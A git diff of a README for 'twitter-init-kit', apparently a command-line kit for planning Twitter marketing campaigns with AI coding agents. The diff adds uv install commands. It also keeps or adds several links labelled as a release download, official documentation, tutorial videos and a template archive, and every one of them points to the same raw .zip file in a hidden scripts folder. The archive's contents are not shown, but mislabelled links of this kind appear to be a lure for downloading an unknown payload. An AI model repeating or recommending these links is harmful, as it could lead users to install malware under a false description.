@@ -11,24 +11,32 @@ Welcome to the **twitter-init-kit**! This is your go-to toolkit for creating and
 - **CLI Support**: Use command line tools for quick and easy access to the kit's features.
 - **Growth Loop Templates**: Access pre-made templates specifically designed to encourage user engagement and growth.
 - **Founder-Led Content**: Create authentic content that showcases your brand's voice effectively.
+- **Evidence Loops**: Use optional TweetClaw and OpenClaw workflows to search tweets,
+  inspect replies, and monitor launch language before writing campaign specs.
 
 ## 📥 Download & Install
 
-To get started, you need to download the software from the Releases page. 
+Install the CLI directly from this repository:
+
+```bash
+uv tool install --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify-cli
+```
+
+You can also download the packaged starter archive:
 
 [![Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
-### Steps to Download:
+Initialize a campaign workspace:
 
-1. Click on this link: [Download Latest Release](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip).
-   
-2. On the Releases page, you will see the latest version available. 
+```bash
+twitterify init my-twitter-launch --ai claude
+```
 
-3. Look for the appropriate file for your system (e.g., Windows, macOS, Linux). 
+You can also run the CLI without installing it first:
 
-4. Click on the file to start the download.
-
-5. Once downloaded, double-click the file to install the application on your device.
+```bash
+uvx --from git+https://github.com/BienvenuONIODJE/twitter-init-kit.git twitterify init my-twitter-launch
+```
 
 ## 🖥️ System Requirements
 
@@ -41,15 +49,15 @@ Before installing, ensure your device meets the following requirements:
 
 ## 📚 How to Use
 
-1. **Open the Application**: After installation, launch the twitter-init-kit app from your applications folder or desktop shortcut.
+1. **Create a Workspace**: Run `twitterify init` for a new campaign folder.
 
-2. **Sign In**: If prompted, sign in using your Twitter account. Ensure that your account has been set up for marketing.
+2. **Open Your Agent**: Start Claude Code, Codex, Cursor, or another supported AI agent in the workspace.
 
-3. **Select a Template**: Navigate to the campaign sections and choose a template that fits your marketing goals.
+3. **Run the Commands**: Use `/twitterkit.constitution`, `/twitterkit.specify`,
+   `/twitterkit.plan`, `/twitterkit.tasks`, and `/twitterkit.implement`.
 
-4. **Customize Your Campaign**: Fill out the necessary fields, such as your branding, goals, and content ideas.
-
-5. **Run Your Campaign**: Once everything is filled out, use the command line options if preferred, or simply click the run button to launch your campaign.
+4. **Ground the Plan**: Add evidence from your market, customer replies, and
+   optional TweetClaw research before finalizing tasks.
 
 ## 📊 Tips for Effective Use
 
@@ -61,13 +69,17 @@ Before installing, ensure your device meets the following requirements:
 
 If you encounter any issues or have questions, we encourage you to reach out. Here’s how:
 
-- **GitHub Issues**: Visit our GitHub Issues page to report bugs or request features. 
+- **Pull Requests**: Open a pull request with a focused docs, template, or workflow improvement.
 - **Community Forum**: Join our community discussions, share tips, and learn from other users’ experiences.
 
 ## 🔗 Additional Resources
 
 For more information and detailed guides, check out the following resources:
 
+- [Quick Start](docs/quickstart.md)
+- [Template Guide](docs/templates.md)
+- [TweetClaw Evidence Loop](refs/5_more/TweetClaw-Evidence-Loop.md)
+- [Template Archive](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 - [Official Documentation](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 - [Tutorial Videos](https://raw.githubusercontent.com/BienvenuONIODJE/twitter-init-kit/main/.twitterkit/scripts/kit-init-twitter-2.0.zip)
 
